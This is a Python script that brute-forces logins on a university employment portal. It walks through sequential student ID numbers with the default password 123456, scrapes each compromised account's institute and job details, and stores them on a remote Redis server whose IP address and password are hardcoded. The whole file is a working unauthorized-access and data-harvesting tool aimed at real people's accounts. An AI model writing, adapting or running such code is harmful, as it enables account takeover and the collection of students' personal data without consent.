import time

import  requests
import  redis
import  re


base_number=12015050801063
invalid=0
user_name=''
pass_word=123456

redis_info={
'host':'119.23.214.123',
'password':'ta',
'port':6379,
'db':0,
}
msg_url='http://jiuye.csmu.edu.cn/jy/desktop/index?note=true'
login_url='http://jiuye.csmu.edu.cn/jy/login'

headers = {
    'content-type': "application/x-www-form-urlencoded",
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36',
    'Connection': 'close'
}

class DbRedis():
    def __init__(self):
        self.conn = None
        if not hasattr(DbRedis,'pool'):
            DbRedis.getRedisConn()
        self.conn=redis.Redis(connection_pool=DbRedis.pool)

    @staticmethod
    def getRedisConn():
        DbRedis.pool=redis.ConnectionPool(host=redis_info['host'],password=redis_info['password'],port=redis_info['port'],db=redis_info['db'])


    """
    string类型 {'key':'value'} redis操作
    """

    def setredis(self, key, value, time=None):
        #非空即真非0即真
        if time:
            res = self.conn.setex(key, value, time)
        else:
            res = self.conn.set(key, value)
        return res

    def getRedis(self, key):
        res = self.conn.get(key).decode()
        return res

    def delRedis(self, key):
        res = self.conn.delete(key)
        return res

    """
    hash类型，{'name':{'key':'value'}} redis操作
    """
    def setHashRedis(self, name, key, value):
        res = self.conn.hset(name, key, value)
        return res


    def getHashRedis(self, name, key=None):
        # 判断key是否我为空，不为空，获取指定name内的某个key的value; 为空则获取name对应的所有value
        if key:
            res = self.conn.hget(name, key)
        else:
            res = self.conn.hgetall(name)
        return res


    def delHashRedis(self, name, key=None):
        if key:
            res = self.conn.hdel(name, key)
        else:
            res = self.conn.delete(name)
        return res




def isexist(html:str):
    if re.search(r'账号不存在',html) is not None or re.search(r'系统错误',html) is not None :
        return False
    else:
        return True


def get_job(text:str):
    job = re.search(r'name=\"yxdw1\" value=\"(.*?)\"', text).group()
    job=str.replace(job,'name="yxdw1" value="', '')
    job=str.replace(job,'"','')
    return job


def get_institute(text:str):
    institutes = re.search(r'important; \" value=\"(.*?)\"\/\>', text).group()
    print(institutes)
    institutes=str.replace(institutes,'important; " value="','')
    institutes=str.replace(institutes,'"/>','')
    return institutes


def save_db(institute,job) :
    global invalid
    dbredis = DbRedis()
    invalid+=1
    dbredis.setHashRedis(str(invalid), 'institute', institute)
    dbredis.setHashRedis(str(invalid), 'job', job)
    print('save access',invalid)

def parse_html(text:str):
    job = get_job(text)
    institute = get_institute(text)
    save_db(institute,job)


def start():
    for i in range(1000006932):
        global base_number
        base_number+=1
        data={'user_name':base_number,'pass_word':pass_word}
        try:
            session=requests.sessions.session()
            session.get(login_url)  #get login of cookie
            res=session.request("POST", login_url, data=data, headers=headers)
            if isexist(res.text) is True:
                print(base_number,'.....................')
                res = session.request("GET", msg_url, headers=headers)
                if isexist(res.text) is True:
                    parse_html(res.text)
                else:
                    print('not find number',base_number)
                    continue
            else:
                print("not find :",base_number)
                continue
        except TimeoutError as e:
            print(e)


if __name__ == '__main__':
   start()


